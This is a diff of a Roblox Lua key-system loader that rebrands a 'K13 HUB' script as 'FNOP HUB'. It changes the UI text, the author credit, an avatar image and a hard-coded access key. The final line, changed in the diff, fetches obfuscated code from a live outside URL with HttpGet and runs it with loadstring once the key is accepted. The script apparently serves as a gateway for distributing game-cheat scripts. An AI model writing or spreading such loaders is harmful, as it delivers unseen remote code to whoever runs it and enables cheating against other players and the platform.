@@ -1,10 +1,10 @@
 -- Configuration
-local VALID_KEYS = { "K13OnTop" }
-local PAYLOAD_URL = "https://example.com/your-script.lua"
+local VALID_KEYS = { "FNOPOnTop" }
+local PAYLOAD_URL = "https://slh-hub.lovable.app/raw/kyomba2-obfuscated"
 
 local function createKeySystemUI()
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "K13KeySystem"
+    screenGui.Name = "FNOPKeySystem"
     screenGui.ResetOnSpawn = false
     screenGui.DisplayOrder = 99999
     screenGui.IgnoreGuiInset = true
@@ -63,7 +63,7 @@ local function createKeySystemUI()
 
     -- Matrix Digital Rain Effect
     task.spawn(function()
-        local charset = { "0", "1", "K", "1", "3", "@", "#", "$", "%", "^", "&", "*", "!", "?", "<", ">", "~", "|" }
+        local charset = { "0", "1", "F", "N", "O", "P", "@", "#", "$", "%", "^", "&", "*", "!", "?", "<", ">", "~", "|" }
 
         for columnIndex = 1, 45 do
             task.spawn(function()
@@ -211,7 +211,7 @@ local function createKeySystemUI()
     local avatarImage = Instance.new("ImageLabel")
     avatarImage.Size = UDim2.new(1, 0, 1, 0)
     avatarImage.BackgroundTransparency = 1
-    avatarImage.Image = "rbxthumb://type=Asset&id=114411506285484&w=420&h=420"
+    avatarImage.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=113281701497572"
     avatarImage.ScaleType = Enum.ScaleType.Fit
     avatarImage.ZIndex = 8
     avatarImage.Parent = avatarFrame
@@ -220,7 +220,7 @@ local function createKeySystemUI()
     brandTitle.Size = UDim2.new(1, 0, 0, 30)
     brandTitle.Position = UDim2.new(0, 0, 0, 200)
     brandTitle.BackgroundTransparency = 1
-    brandTitle.Text = "K13 ALWAYS ON TOP"
+    brandTitle.Text = "FNOP ALWAYS ON TOP"
     brandTitle.Font = Enum.Font.LuckiestGuy
     brandTitle.TextSize = 17
     brandTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -231,7 +231,7 @@ local function createKeySystemUI()
     brandSub.Size = UDim2.new(1, 0, 0, 20)
     brandSub.Position = UDim2.new(0, 0, 0, 235)
     brandSub.BackgroundTransparency = 1
-    brandSub.Text = "BY PRIME JELO"
+    brandSub.Text = "BY PRIME KENZOU"
     brandSub.Font = Enum.Font.LuckiestGuy
     brandSub.TextSize = 14
     brandSub.TextColor3 = Color3.fromRGB(200, 150, 255)
@@ -242,7 +242,7 @@ local function createKeySystemUI()
     versionLabel.Size = UDim2.new(1, 0, 0, 16)
     versionLabel.Position = UDim2.new(0, 0, 0, 258)
     versionLabel.BackgroundTransparency = 1
-    versionLabel.Text = "K13 HUB V2.0"
+    versionLabel.Text = "FNOP HUB V2.0"
     versionLabel.Font = Enum.Font.LuckiestGuy
     versionLabel.TextSize = 11
     versionLabel.TextColor3 = Color3.fromRGB(80, 40, 110)
@@ -261,7 +261,7 @@ local function createKeySystemUI()
     titleHeader.Size = UDim2.new(1, -20, 0, 40)
     titleHeader.Position = UDim2.new(0, 10, 0, 25)
     titleHeader.BackgroundTransparency = 1
-    titleHeader.Text = "K13 | KEY SYSTEM"
+    titleHeader.Text = "FNOP | KEY SYSTEM"
     titleHeader.Font = Enum.Font.LuckiestGuy
     titleHeader.TextSize = 26
     titleHeader.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -283,7 +283,7 @@ local function createKeySystemUI()
 
     task.spawn(function()
         task.wait(0.5)
-        local targetMessage = "ENTER YOUR KEY TO ACCESS K13 HUB..."
+        local targetMessage = "ENTER YOUR KEY TO ACCESS FNOP HUB..."
         for charIndex = 1, #targetMessage do
             if not animatedSubtitle.Parent then break end
             animatedSubtitle.Text = string.sub(targetMessage, 1, charIndex)
@@ -408,7 +408,7 @@ submitButton.MouseButton1Click:Connect(function()
 
     if keyMatches then
         statusLabel.TextColor3 = Color3.fromRGB(0, 255, 120)
-        statusLabel.Text = "ACCESS GRANTED! LOADING K13 HUB..."
+        statusLabel.Text = "ACCESS GRANTED! LOADING FNOP HUB..."
 
         submitButton.Active = false
         submitButton.Text = "LOADING..."
@@ -445,4 +445,4 @@ end)
 
 -- Wait for UI access signal before loading payload
 accessGrantedSignal.Event:Wait()
-loadstring(game:HttpGet(PAYLOAD_URL))()
+loadstring(game:HttpGet("https://slh-hub.lovable.app/raw/kyomba2-obfuscated"))()
